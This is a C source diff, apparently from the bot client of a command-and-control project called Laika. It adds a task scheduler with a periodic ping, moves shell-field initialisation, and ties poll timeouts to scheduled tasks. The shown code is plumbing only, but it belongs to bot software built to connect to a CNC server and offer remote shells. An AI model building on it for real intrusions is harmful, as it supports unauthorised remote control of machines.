@@ -58,8 +58,6 @@ struct sLaika_bot *laikaB_newBot(void) {
     char *tempINBuf;
     size_t _unused;
 
-    bot->shell = NULL;
-
     laikaP_initPList(&bot->pList);
     bot->peer = laikaS_newPeer(
         laikaB_pktTbl,
@@ -68,6 +66,12 @@ struct sLaika_bot *laikaB_newBot(void) {
         (void*)bot,
         (void*)bot
     );
+
+    laikaT_initTaskService(&bot->tService);
+    laikaT_newTask(&bot->tService, 5000, laikaB_pingTask, (void*)bot);
+
+    bot->shell = NULL;
+    bot->shellTask = NULL;
 
     /* generate keypair */
     if (sodium_init() < 0) {
@@ -112,6 +116,7 @@ void laikaB_freeBot(struct sLaika_bot *bot) {
 
     laikaP_cleanPList(&bot->pList);
     laikaS_freePeer(bot->peer);
+    laikaT_cleanTaskService(&bot->tService);
 
     /* clear shell */
     if (bot->shell)
@@ -145,16 +150,19 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
         LAIKA_ERROR("failed to gen session key!\n");
 }
 
-bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
+bool laikaB_poll(struct sLaika_bot *bot) {
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
     /* flush any events prior (eg. made by a task) */
     laikaP_flushOutQueue(&bot->pList);
-    evnt = laikaP_poll(&bot->pList, timeout, &numEvents);
+    evnt = laikaP_poll(&bot->pList, laikaT_timeTillTask(&bot->tService), &numEvents);
 
-    if (numEvents == 0) /* no events? timeout was reached */
+    /* no events? timeout was reached */
+    if (numEvents == 0) {
+        laikaT_pollTasks(&bot->tService);
         return false;
+    }
 
     laikaP_handleEvent(evnt);
 
